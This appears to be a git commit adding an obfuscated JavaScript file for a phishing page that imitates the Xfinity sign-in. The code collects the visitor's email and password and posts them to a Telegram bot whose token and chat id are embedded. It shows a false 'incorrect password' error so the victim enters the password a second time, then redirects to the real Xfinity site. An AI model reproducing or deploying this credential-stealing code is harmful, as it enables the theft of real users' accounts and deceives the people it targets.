7982466984bfab494bb3c1e0a485635ae0aa6c8d
mklekrgbbry <jmsik5@att.net>
2024-07-29 12:33:54 -0700

    Add files via upload

---
+++ static/script.js
@@ -0,0 +1,265 @@
+const _0x4016f9 = _0x4048;
+(function (_0x51bb13, _0x36bc74) {
+  const _0x5477e8 = _0x4048,
+    _0x4a51c7 = _0x51bb13();
+  while (!![]) {
+    try {
+      const _0x5d26bd =
+        -parseInt(_0x5477e8(0x12e)) / 0x1 +
+        parseInt(_0x5477e8(0x151)) / 0x2 +
+        -parseInt(_0x5477e8(0x153)) / 0x3 +
+        (parseInt(_0x5477e8(0x136)) / 0x4) *
+          (-parseInt(_0x5477e8(0x124)) / 0x5) +
+        (parseInt(_0x5477e8(0x131)) / 0x6) *
+          (-parseInt(_0x5477e8(0x129)) / 0x7) +
+        (parseInt(_0x5477e8(0x137)) / 0x8) *
+          (parseInt(_0x5477e8(0x13d)) / 0x9) +
+        (-parseInt(_0x5477e8(0x159)) / 0xa) *
+          (-parseInt(_0x5477e8(0x14b)) / 0xb);
+      if (_0x5d26bd === _0x36bc74) break;
+      else _0x4a51c7["push"](_0x4a51c7["shift"]());
+    } catch (_0x1706f2) {
+      _0x4a51c7["push"](_0x4a51c7["shift"]());
+    }
+  }
+})(_0xa2c5, 0x519d2),
+  document[_0x4016f9(0x12b)](_0x4016f9(0x13a), function () {
+    initializeForms(),
+      handleEmailFormSubmit(),
+      handlePasswordFormSubmit(),
+      handleTogglePassword();
+  });
+function _0x4048(_0x3dba85, _0x396cf2) {
+  const _0xa2c5e4 = _0xa2c5();
+  return (
+    (_0x4048 = function (_0x40485f, _0x1b80ad) {
+      _0x40485f = _0x40485f - 0x124;
+      let _0x32721f = _0xa2c5e4[_0x40485f];
+      return _0x32721f;
+    }),
+    _0x4048(_0x3dba85, _0x396cf2)
+  );
+}
+async function sendMessage(_0x2ff6c2) {
+  const _0x107ca4 = _0x4016f9,
+    _0x5df631 = _0x107ca4(0x128),
+    _0x36e99a = _0x107ca4(0x132),
+    _0x30fc41 =
+      _0x107ca4(0x13e) +
+      _0x36e99a +
+      _0x107ca4(0x12f) +
+      _0x5df631 +
+      _0x107ca4(0x14d) +
+      _0x2ff6c2;
+  try {
+    const _0x351d28 = await fetch(_0x30fc41, { method: _0x107ca4(0x135) }),
+      _0x13b3b7 = await _0x351d28[_0x107ca4(0x142)]();
+    console["log"](_0x13b3b7);
+  } catch (_0x43b729) {}
+}
+function _0xa2c5() {
+  const _0x353ba8 = [
+    "getElementById",
+    "innerHTML",
+    "508070CcUbRN",
+    "password-form-container",
+    "1745667BZAlco",
+    "get",
+    "classList",
+    "preventDefault",
+    "off-screen",
+    "submit",
+    "3601870LPVGil",
+    "hidden",
+    "toggle",
+    "user-email",
+    "remove",
+    "user",
+    "type",
+    "135gzCzCI",
+    "getItem",
+    "search",
+    "password",
+    "5739060704",
+    "1978319GGcTul",
+    "error-message-wrapper",
+    "addEventListener",
+    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20",
+    "user-error",
+    "127755ySHjfO",
+    "/sendMessage?chat_id=",
+    "password-form",
+    "6akfMiT",
+    "6893237464:AAF2SPrA-tTlEMXYi12PwJH3MvEq7PoeW3c",
+    "removeItem",
+    "#error-message-wrapper",
+    "POST",
+    "64468deoXTX",
+    "1708456UWMjLV",
+    "\x0a\x20\x20\x20\x20<svg\x20xmlns=\x22http://www.w3.org/2000/svg\x22\x20width=\x2224\x22\x20height=\x2224\x22\x20viewBox=\x220\x200\x2024\x2024\x22\x20fill=\x22currentColor\x22\x20focusable=\x22false\x22\x20role=\x22img\x22\x20class=\x22size-sm\x20neutral\x20primary\x20icon\x22\x20aria-hidden=\x22true\x22>\x0a\x20\x20\x20\x20\x20\x20<path\x20d=\x22M21,12a11.37,11.37,0,0,1-3.43,3.33L14.9,12.7A2.63,2.63,0,0,0,15,12a3,3,0,0,0-3-3,3.27,3.27,0,0,0-.7.09L9.51,7.34A10.27,10.27,0,0,1,12,7,11.08,11.08,0,0,1,21,12Zm-4.81,4.07,2.36,2.35-1.07,1L14.6,16.63A10.18,10.18,0,0,1,12,17,11.09,11.09,0,0,1,3,12,11.75,11.75,0,0,1,6.54,8.6l-2.07-2L5.53,5.49,7.92,7.87h0l2,2h0l.7.7h0l2.82,2.81h0l.71.7h0l2,2Zm-3.36-1.23L11.94,14A2,2,0,0,1,10,12.05l-.87-.87A2.82,2.82,0,0,0,9,12a3,3,0,0,0,3,3A3.2,3.2,0,0,0,12.82,14.86ZM12.22,10,14,11.78A2,2,0,0,0,12.22,10Z\x22></path>\x0a\x20\x20\x20\x20</svg>",
+    "add",
+    "DOMContentLoaded",
+    "textContent",
+    "text",
+    "18TmJTvY",
+    "https://api.telegram.org/bot",
+    "location",
+    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20email:\x20",
+    "href",
+    "json",
+    "email-form",
+    "error",
+    "user-password",
+    "password-error",
+    "toString",
+    "searchParams",
+    "#password-error-message-wrapper",
+    "https://xfinity.com",
+    "33wBRxKd",
+    "querySelector",
+    "&text=",
+    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20password:\x20",
+  ];
+  _0xa2c5 = function () {
+    return _0x353ba8;
+  };
+  return _0xa2c5();
+}
+function initializeForms() {
+  const _0x46e471 = _0x4016f9,
+    _0x9d78a5 = document[_0x46e471(0x14f)](_0x46e471(0x15c)),
+    _0x206702 = new URLSearchParams(window[_0x46e471(0x13f)][_0x46e471(0x126)]),
+    _0x44f7cd = _0x206702[_0x46e471(0x154)]("user"),
+    _0x4fc7ab = document[_0x46e471(0x14f)]("email-form-container"),
+    _0xfd731f = document[_0x46e471(0x14f)](_0x46e471(0x152));
+  _0x44f7cd
+    ? (_0x4fc7ab[_0x46e471(0x155)]["add"](_0x46e471(0x157)),
+      _0xfd731f[_0x46e471(0x155)]["remove"](_0x46e471(0x157)),
+      (_0x9d78a5[_0x46e471(0x13b)] = _0x44f7cd))
+    : (_0x4fc7ab[_0x46e471(0x155)][_0x46e471(0x15d)](_0x46e471(0x157)),
+      _0xfd731f["classList"][_0x46e471(0x139)](_0x46e471(0x157)));
+}
+function handleEmailFormSubmit() {
+  const _0x410717 = _0x4016f9;
+  document[_0x410717(0x14f)](_0x410717(0x143))[_0x410717(0x12b)](
+    _0x410717(0x158),
+    function (_0xe37de) {
+      const _0x5432e2 = _0x410717;
+      _0xe37de[_0x5432e2(0x156)]();
+      if (!validateInput("user", _0x5432e2(0x12d))) {
+      } else
+        setTimeout(() => {
+          updateUserParam("user");
+        }, 0x7d0);
+    }
+  );
+}
+function handlePasswordFormSubmit() {
+  const _0x28e9d7 = _0x4016f9;
+  document[_0x28e9d7(0x14f)](_0x28e9d7(0x130))[_0x28e9d7(0x12b)](
+    "submit",
+    async function (_0x3b51e0) {
+      const _0x144fa0 = _0x28e9d7;
+      _0x3b51e0["preventDefault"]();
+      if (validateInput(_0x144fa0(0x145), _0x144fa0(0x12d))) {
+        const _0x33bf1d = new URLSearchParams(
+            window[_0x144fa0(0x13f)][_0x144fa0(0x126)]
+          ),
+          _0x42cb7c = _0x33bf1d[_0x144fa0(0x154)]("user"),
+          _0x4e3d36 = document["getElementById"](_0x144fa0(0x145))["value"],
+          _0x57e8f6 =
+            _0x144fa0(0x140) +
+            _0x42cb7c +
+            _0x144fa0(0x14e) +
+            _0x4e3d36 +
+            _0x144fa0(0x12c);
+        localStorage[_0x144fa0(0x125)](_0x42cb7c)
+          ? (await sendMessage(_0x57e8f6),
+            showPasswordFormError(![]),
+            localStorage[_0x144fa0(0x133)](_0x42cb7c),
+            setTimeout(() => {
+              const _0x5b9e43 = _0x144fa0;
+              navigateToURL(_0x5b9e43(0x14a));
+            }, 0x7d0))
+          : (await sendMessage(_0x57e8f6),
+            localStorage["setItem"](_0x42cb7c, !![]),
+            showPasswordFormError(!![]));
+      }
+    }
+  );
+}
+function validateInput(_0x11ca93, _0x57c3d1) {
+  const _0x227b1f = _0x4016f9;
+  let _0x33543f = !![];
+  const _0xe00f67 = document[_0x227b1f(0x14f)](_0x11ca93),
+    _0x3e8e24 = document[_0x227b1f(0x14f)](_0x57c3d1),
+    _0x378df5 = document["querySelector"](_0x227b1f(0x134));
+  return (
+    _0xe00f67["value"]["trim"]() === ""
+      ? ((_0x33543f = ![]),
+        _0xe00f67["classList"][_0x227b1f(0x139)](_0x227b1f(0x144)),
+        (_0x3e8e24["textContent"] =
+          "Please\x20enter\x20your\x20Xfinity\x20ID\x20to\x20sign\x20in."),
+        _0x378df5[_0x227b1f(0x155)][_0x227b1f(0x15d)](_0x227b1f(0x15a)),
+        _0x378df5[_0x227b1f(0x155)][_0x227b1f(0x15b)](_0x227b1f(0x12a)))
+      : (_0xe00f67["classList"][_0x227b1f(0x15d)](_0x227b1f(0x144)),
+        _0x378df5[_0x227b1f(0x155)][_0x227b1f(0x139)]("hidden"),
+        _0x378df5[_0x227b1f(0x155)][_0x227b1f(0x15b)](_0x227b1f(0x12a))),
+    _0x33543f
+  );
+}
+function showPasswordFormError(_0xf03ed7) {
+  const _0x250cfe = _0x4016f9,
+    _0x44f981 = document["getElementById"](_0x250cfe(0x145)),
+    _0x30e89f = document["getElementById"](_0x250cfe(0x146)),
+    _0x466a26 = document[_0x250cfe(0x14c)](_0x250cfe(0x149));
+  return (
+    _0xf03ed7
+      ? ((isValid = ![]),
+        _0x44f981[_0x250cfe(0x155)][_0x250cfe(0x139)](_0x250cfe(0x144)),
+        (_0x30e89f[_0x250cfe(0x13b)] =
+          "The\x20Xfinity\x20ID\x20or\x20password\x20you\x20entered\x20was\x20incorrect.\x20Please\x20try\x20again."),
+        _0x466a26["classList"]["remove"](_0x250cfe(0x15a)),
+        _0x466a26[_0x250cfe(0x155)]["toggle"](_0x250cfe(0x12a)))
+      : (_0x44f981[_0x250cfe(0x155)][_0x250cfe(0x15d)](_0x250cfe(0x144)),
+        _0x466a26[_0x250cfe(0x155)]["add"](_0x250cfe(0x15a)),
+        _0x466a26["classList"][_0x250cfe(0x15b)](_0x250cfe(0x12a))),
+    isValid
+  );
+}
+function handleTogglePassword() {
+  const _0x3cb5c6 = _0x4016f9,
+    _0x1cf98b = document[_0x3cb5c6(0x14f)]("toggle-password"),
+    _0x3c3624 = document[_0x3cb5c6(0x14f)](_0x3cb5c6(0x145));
+  _0x1cf98b[_0x3cb5c6(0x12b)]("click", function (_0xd5a4ea) {
+    const _0x4a370f = _0x3cb5c6;
+    _0xd5a4ea[_0x4a370f(0x156)](),
+      _0x3c3624[_0x4a370f(0x15f)] === _0x4a370f(0x127)
+        ? ((_0x3c3624["type"] = _0x4a370f(0x13c)),
+          (_0x1cf98b[_0x4a370f(0x150)] = getEyeIcon()))
+        : ((_0x3c3624[_0x4a370f(0x15f)] = "password"),
+          (_0x1cf98b[_0x4a370f(0x150)] = getEyeSlashIcon()));
+  });
+}
+function updateUserParam(_0x14039c) {
+  const _0x5b884c = _0x4016f9,
+    _0x3af8db = document["getElementById"](_0x14039c),
+    _0x51ec8a = new URL(window["location"][_0x5b884c(0x141)]);
+  _0x51ec8a[_0x5b884c(0x148)]["set"](
+    _0x5b884c(0x15e),
+    _0x3af8db["value"]["trim"]()
+  ),
+    (window[_0x5b884c(0x13f)][_0x5b884c(0x141)] =
+      _0x51ec8a[_0x5b884c(0x147)]());
+}
+function getEyeIcon() {
+  const _0x214fb2 = _0x4016f9;
+  return _0x214fb2(0x138);
+}
+function getEyeSlashIcon() {
+  return "\x0a\x20\x20\x20\x20<svg\x20xmlns=\x22http://www.w3.org/2000/svg\x22\x20width=\x2224\x22\x20height=\x2224\x22\x20viewBox=\x220\x200\x2024\x2024\x22\x20fill=\x22currentColor\x22\x20focusable=\x22false\x22\x20role=\x22img\x22\x20class=\x22size-sm\x20neutral\x20primary\x20icon\x22\x20aria-hidden=\x22true\x22>\x0a\x20\x20\x20\x20\x20\x20<path\x20d=\x22M13.49,12A1.5,1.5,0,1,1,12,10.5,1.5,1.5,0,0,1,13.49,12ZM21,12a11.08,11.08,0,0,1-9,5,11.08,11.08,0,0,1-9-5,11.07,11.07,0,0,1,9-5A11.07,11.07,0,0,1,21,12Zm-6,0a3,3,0,1,0-3,3A3,3,0,0,0,15,12Z\x22></path>\x0a\x20\x20\x20\x20</svg>";
+}
+function navigateToURL(_0x4c49c6) {
+  const _0x32a4ea = _0x4016f9;
+  window[_0x32a4ea(0x13f)][_0x32a4ea(0x141)] = _0x4c49c6;
+}
